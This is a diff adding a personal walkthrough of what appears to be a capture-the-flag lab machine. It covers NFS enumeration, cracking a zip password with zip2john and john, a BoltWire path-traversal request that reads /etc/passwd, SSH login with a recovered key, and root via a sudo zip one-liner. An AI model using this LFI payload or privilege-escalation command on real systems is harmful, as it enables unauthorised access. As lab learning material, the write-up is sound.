@@ -1,0 +1,81 @@
+1. ran an nmap scan and found these open
+    1. port 22-ssh
+    2. port 80-http
+    3. port 8080-http
+    4. port 111-rpcbind
+    5. port 2049-rpc(networkfile share)
+    
+    ---
+    
+2. used showmount -e 192.168.1.41 to check the name of the mounted share and it was
+    1. /srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
+    2. so then i used created a /mnt dir in temp folder to be used to mount the directory using
+    3. mount -t nfs 192.168.1.41:/srv/nfs /tmp/mnt
+    
+    ---
+    
+3. found a .zip file called save.zip inside the share but it was password protected
+
+---
+
+1. So i used zip2john to get the password hash out of the file by using
+    1. zip2john save.zip > output.txt
+
+---
+
+1. after i got the hash i simply used john to crack that password by using
+    1. john wordlist=<rockyou.txt> output.txt and got the password “java101”
+
+---
+
+1. this allowed to me to unzip save.zip and i got 2 files
+    1. todo.txt with the intials jp, so need to find out that name
+    2. id_rsa (used for file login ssh)
+
+---
+
+1. i tried to crack the ssh password but got nowhere so i moved onto the websites
+
+---
+
+1. ran a gobuster scan on http://192.168.1.40:80 and found these subdirs
+    1. /public: this one led nowhere
+    2. /app: this one had a bunch of useless files but i found config.yml which had username:bolt and password:I_love_java so i saved it
+    3. /vendor: another useless one
+    4. /extensions: another useless one
+    
+    ---
+    
+2. ran gobuster on http://192.168.1.41:8080 and found one sub dir
+    1. /dev: this was a website called boltwire, it had rego login, admin panel but could only use rego and login, so i made an account but got nothing more 
+
+---
+
+1. searched up boltwire exploit and found this usefull one https://www.exploit-db.com/exploits/48411
+    1. it is a LFI vuln and it allowed me to check the passwd file by using
+    2. http://192.168.1.41:8080/dev/p=action.search&action=../../../../../../../etc/passwd
+    3. this showed me that JP was a user called jeanpaul
+
+---
+
+1. so i tried to use the id_rsa folder along with I_love_java password and boom it worked i logged in so onto priv esc
+
+---
+
+1. looked around folders but found nothing good, 
+    1. nothing good in /etc/crontab
+    2. nothing good with SUID bit set
+
+---
+
+1. but with sudo -l i found i can run /usr/bin/zip
+
+---
+
+so i checked gtfobins and found i can run these commands to escalate privs
+
+TF=$(mktemp -u)
+
+sudo zip $TF /etc/hosts -T -TT ‘sh #’
+
+and when root rm $TF
